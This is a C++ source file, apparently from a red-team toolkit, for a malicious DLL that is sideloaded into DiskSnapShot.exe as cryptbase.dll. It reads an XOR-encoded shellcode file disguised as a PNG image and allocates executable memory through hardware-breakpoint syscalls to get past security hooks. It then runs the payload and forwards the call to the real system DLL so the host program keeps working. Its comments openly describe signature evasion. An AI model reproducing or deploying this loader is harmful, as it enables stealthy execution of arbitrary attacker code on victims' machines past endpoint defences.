// x86_64-w64-mingw32-g++ -static sideloader.cpp HWSyscalls.cpp cryptbase.def -s -w -shared -o /share/sideloader.dll -fpermissive
// sideload into DiskSnapShot.exe as cryptbase.dll
#include <iostream>
#include "HWSyscalls.h"

typedef NTSTATUS(NTAPI *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

unsigned char* decoded;

int decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
{
    decoded = (unsigned char*)malloc(size);
    for (int i = 0; i < size; i++)
    {
        decoded[i] = encoded[i] ^ key[i % keylen];
    }
    return 0;
}

int hittem()
{
    char *fileName = "C:\\Windows\\image02.png";

    // Get size of raw shellcode file
    FILE * file = fopen(fileName, "rb");
    if (file == NULL) return 1;
    fseek(file, 0, SEEK_END);
    SIZE_T size = ftell(file);
    fclose(file);

    // Allocate memory according to size, and read contents of file into buffer
    file = fopen(fileName, "rb");
    unsigned char * shellcode = (unsigned char *) malloc(size);
    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
    fclose(file);

    // XOR key. Make sure it matches the key used to encode shellcode
    unsigned char key[] = "OPERATORCHANGEMEPLZZZ";

    // random crap... helps evade some signatures; feel free to replace with whatever...
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE); 
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    // decode shellcode and free heap memory
    decode(shellcode, key, strlen(key), size);
    free(shellcode);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)"NtAllocateVirtualMemory");

    if (!pNtAllocateVirtualMemory) {
        std::cerr << "[-] Failed to prepare syscall for NtAllocateVirtualMemory." << std::endl;
        return -2;
    }
    NTSTATUS status = 0;
    PVOID base_addr = NULL;
    status = pNtAllocateVirtualMemory(GetCurrentProcess(), &base_addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] NtAllocateVirtualMemory result: " << status << std::endl;
    
    // allocate RWX memory, copy decoded shellcode, and free heap memory
    memcpy(base_addr, decoded, size);
    free(decoded);

    //execute shellcode via function pointer
    ((void(*)())base_addr)();

    return 0;
}

typedef BOOL(*SystemFunction036_Type)(void* buffer, ULONG len);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" __declspec(dllexport) DWORD SystemFunction036_Proxy(void* buffer, ULONG len)
{
    //init syscalls
    if (!InitHWSyscalls())
        return -1;

    // Call function to load shellcode
    hittem();

    //de-init syscalls
    if (DeinitHWSyscalls())
        std::cout << "[+] Cleaned up the exception handler." << std::endl;
    else
        std::cerr << "[-] Failed to clean up the exception handler." << std::endl;

    // Load original DLL and get function pointer
    SystemFunction036_Type Original_SystemFunction036 = (SystemFunction036_Type)GetProcAddress(LoadLibrary("C:\\Windows\\System32\\CRYPTBASE.dll"), "SystemFunction036");
    BOOL result = Original_SystemFunction036(buffer, len);
    return result;
}
